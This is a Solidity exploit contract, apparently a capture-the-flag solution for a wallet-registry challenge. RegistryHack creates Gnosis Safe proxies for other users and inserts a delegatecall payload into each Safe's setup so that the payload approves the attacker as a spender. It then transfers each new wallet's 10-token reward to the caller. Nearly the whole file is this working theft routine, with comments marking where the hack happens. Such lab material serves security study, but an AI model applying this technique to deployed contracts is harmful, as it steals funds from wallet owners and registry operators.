// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../WalletRegistry.sol";

import "hardhat/console.sol";

contract DelegateHelper {

    function approve(address token, address spender) public {
        IERC20 tokenERC20 = IERC20(token);
        tokenERC20.approve(spender, 10 ether);
    }
}

contract RegistryHack {

    constructor(
        WalletRegistry registryAddress,
        address[] memory initialBeneficiaries
    ) {
        GnosisSafeProxyFactory factory = GnosisSafeProxyFactory(registryAddress.walletFactory());
        IERC20 token = registryAddress.token();

        for (uint256 i = 0; i < initialBeneficiaries.length; ++i) {
            address[] memory owners = new address[](1);
            owners[0] = initialBeneficiaries[i];

            // Hack is here. Use IERC20.approve inside Data payload for optional delegate call.
            // This Data payload used inside proxy Setup call.
            // These kind of callbacks leave place to attacks with 'no storage vars dependent methods'.
            address to = address(new DelegateHelper());
            bytes memory data = abi.encodeWithSignature(
                "approve(address,address)",
                address(token),
                address(this)
            );

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                to,
                data,
                address(0),
                address(0),
                0,
                payable(address(0))
            );

            GnosisSafeProxy proxy =
                factory.createProxyWithCallback(registryAddress.masterCopy(), initializer, i, IProxyCreationCallback(registryAddress));

            //Now transfer the funds as we have approve.
            token.transferFrom(address(proxy), msg.sender, 10 ether);
        }

    }
}